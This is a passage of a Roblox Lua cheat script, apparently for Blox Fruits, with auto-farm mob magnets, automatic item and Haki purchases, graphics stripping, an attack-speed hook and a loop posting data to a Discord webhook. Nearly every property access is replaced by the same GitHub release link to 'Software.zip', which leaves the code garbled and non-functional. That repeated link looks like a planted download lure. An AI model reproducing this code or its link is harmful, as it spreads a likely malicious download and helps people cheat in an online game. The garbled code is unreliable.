                    end
                elseif AutoBartilo and MagnetBatilo and Magnet then
                    if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Swan Pirate [Lv. 775]" and v:FindFirstChild("Humanoid") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMonBartilo
                        sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                    end
                elseif AutoRengoku and RengokuMagnet and Magnet then
                    if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Snow Lurker [Lv. 1375]" or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Arctic Warrior [Lv. 1350]") and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 350 then
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMonRengoku
                        sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                    end
                elseif Auto_Bone and BoneMagnet and Magnet then
                    if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Reborn Skeleton [Lv. 1975]" or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Living Zombie [Lv. 2000]" or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Demonic Soul [Lv. 2025]" or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Posessed Mummy [Lv. 2050]") and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 300 then
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = MainMonBone
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Animator") then
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()
                        end
                        sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius",  https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
						https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(11)
                    end
                elseif Auto_Candy and CandyMagnet and Magnet then
                    if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Peanut Scout [Lv. 2075]" or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Peanut President [Lv. 2100]" or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Ice Cream Chef [Lv. 2125]" or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Posessed Mummy [Lv. 2050]") and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 300 then
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = MainCandy
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Animator") then
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()
                        end
                        sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius",  https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
						https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(11)
                    end
                elseif Auto_Beli and BeliMagnet and Magnet then
                    if (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Cookie Crafter [Lv. 2200]" or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Cake Guard [Lv. 2225]" or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Baking Staff [Lv. 2250]" or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Head Baker [Lv. 2275]") and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 300 then
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = MainBeli
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Animator") then
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()
                        end
                        sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius",  https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
						https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(11)
                    end
                elseif AutoEcto and EctoplasMagnet and Magnet then
                    if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "Ship") and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 300 then
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMonEctoplas
                        sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                    end
                elseif AutoEvoRace and EvoMagnet and Magnet then
                    if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Zombie [Lv. 950]" and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 300 then
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMonZombie
                        sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                    end
                elseif AutoCitizen and CitizenMagnet and Magnet then
                    if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Forest Pirate [Lv. 1825]" and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 300 then
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMonZombie
                        sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                    end
                 elseif AutoCitizen and CitizenMagnet and Magnet then
                    if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Forest Pirate [Lv. 1825]" and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 300 then
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMonZombie
                        sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                    end
                elseif AutoFarmSelectMonster and AutoFarmSelectMonsterMagnet and Magnet then
                    if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == Ms and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude <= 400 then
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(60, 60, 60)
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMonSelectMonster
                        sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius", https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
                    end
                end
            end
        end)
    end
end)

if AutoKaitan then
    CheckBarto = vu
    if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Warrior Helmet") then
        Success = true
    elseif https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Warrior Helmet") then
        Success = true
    end
    if Success and CheckBarto == true then
        print("success ok")
    elseif CheckBarto == true and MiscFarmWeapon == "" then
        print("fuck you")
    elseif game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("BartiloQuestProgress","Bartilo") == 3 and CheckBarto == true then
        print("success ok")
    else
        AutoBartilo = vu
        if vu == false then
            wait(1)
            TP(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
        end
    end
end

PlayerName = {}
for i,v in pairs(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()) do  
	https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(PlayerName ,https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
end
function isnil(thing)
	return (thing == nil)
end
local function round(n)
	return https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(tonumber(n) + 0.5)
end
Number = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(1, 1000000)

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true

local updateStatus = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(function() -- ngu qua ma. huuh
    while https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip do
        AutoHaki()
        wait(0.1)
    end
end)

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(updateStatus)

local url = DCSettings["WebhookUrl"]

spawn(function()
	while DCSettings["Enabled"] do
        local newdata = game:GetService("HttpService"):JSONEncode(data)
        local headers = {["content-type"] = "application/json"}
        request = http_request or request or HttpPost or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
        local webhook = {Url = url, Body = newdata, Method = "POST", Headers = headers}
        request(webhook)
        wait(DCSettings["Time"])
	end
end)

spawn(function()
	while wait() do
		if FSSettings["BuySwords"] then
            local itemNames = {"Cutlass", "Katana", "Iron Mace", "Duel Katana", "Triple Katana", "Pipe", "Dual-Headed Blade", "Bisento", "Soul Cane", "Slingshot", "Musket", "Flintlock", "Refined Flintlock", "Cannon"}
            local replicatedStorage = game:GetService("ReplicatedStorage")
            local remoteCommF = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

            for _, itemName in ipairs(itemNames) do
                remoteCommF:InvokeServer("BuyItem", itemName)
            end
        end 
	end
end)

spawn(function()
	while wait() do
		if FSSettings["BuyAccessories"] then
            local itemNames = {"Black Cape", "Tomoe", "Swordsman Hat"}
            local replicatedStorage = game:GetService("ReplicatedStorage")
            local remoteCommF = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

            for _, itemName in ipairs(itemNames) do
                remoteCommF:InvokeServer("BuyItem", itemName)
            end
        end 
	end
end)

print("dit me legitterium. skid ngu vai cut - thuy")

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(function()
    local player = game:GetService("Players").LocalPlayer
    local beli = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local commF = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

    while wait() do
        if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip then
            local function buyHaki(hakiType)
                local args = {
                    [1] = "BuyHaki",
                    [2] = hakiType
                }
                commF:InvokeServer(unpack(args))
            end
            
            local function buyKenTalk(action)
                local args = {
                    [1] = "KenTalk",
                    [2] = action
                }
                commF:InvokeServer(unpack(args))
            end

            if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip >= 300000 and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip < 750000 then
                buyHaki("Buso")
                buyHaki("Geppo")
                buyHaki("Soru")
            elseif https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip >= 750000 then
                buyKenTalk("Start")
                buyKenTalk("Buy")
            end
        end
    end
end)

if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip then
    local lighting = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
    https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
    settings()https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Level01"

    for _,v in pairs(game:GetDescendants()) do
        if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Plastic"
            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0)
        elseif v:IsA("Explosion") then
            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1
            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1
        elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
        elseif v:IsA("MeshPart") then
            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Plastic"
            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
        end
    end

    for _,e in pairs(lighting:GetChildren()) do
        if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
        end
    end
end

local Client = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
local STOP = require(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
local STOPRL = require(game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
if not https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip then https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip end
if not https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip then https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip end
while https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip() do
				https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = function(a,b,c,d,func)
					local Hits = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(b,c,d)
					if Hits then
						https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = function() end
						a:Play(0.01,0.01,0.01)
						func(Hits)
						https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
						wait(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip * 0.5)
						a:Stop()
					end
				end
end
